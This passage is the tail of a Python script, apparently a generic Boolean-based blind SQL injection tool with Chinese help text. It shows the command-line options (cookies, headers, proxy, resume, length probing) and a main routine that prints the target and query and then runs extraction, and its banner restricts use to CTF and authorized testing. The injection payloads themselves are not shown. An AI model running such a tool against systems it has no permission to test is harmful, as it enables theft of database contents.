    parser.add_argument("--probe-samples", type=int, default=2, help="闭合方式探测时每个候选真/假请求采样次数")
    parser.add_argument("--no-length-detect", action="store_true", help="跳过长度探测")
    parser.add_argument("--resume", help="断点续传文件路径，例如 result.tmp")
    parser.add_argument("--save-every", type=int, default=5, help="断点文件每完成 N 位保存一次")
    parser.add_argument("--save-interval", type=float, default=2.0, help="断点文件至少每隔多少秒保存一次")

    parser.add_argument("--cookies", nargs="+", metavar="k=v", help="Cookie，可多个")
    parser.add_argument("--headers", nargs="+", metavar="k:v", help="Header，可多个")
    parser.add_argument("--proxy", help="代理，例如 http://127.0.0.1:8080")
    parser.add_argument("--verbose", action="store_true", help="输出调试信息")

    return parser.parse_args()


def main() -> int:
    print(LOGO)
    print("=" * 50)
    print("  通用 Boolean-Based SQL 盲注脚本")
    print("  仅用于 CTF / 授权测试 / 本地靶场")
    print("=" * 50)

    try:
        args = parse_args()
        cfg = build_config(args)
    except Exception as e:
        print(f"[!] 参数错误: {e}")
        return 2

    print(f"[*] 目标: {cfg.url}")
    print(f"[*] 参数: {cfg.param}")
    print(f"[*] 查询: {cfg.query}")
    print(f"[*] 真值特征模式: {'auto' if cfg.auto_mark else cfg.check_mode}")
    print()

    try:
        extract(cfg)
        return 0
    except KeyboardInterrupt:
        print("\n[!] 用户中断。")
        return 130
    except Exception as e:
        print(f"\n[!] 运行异常: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
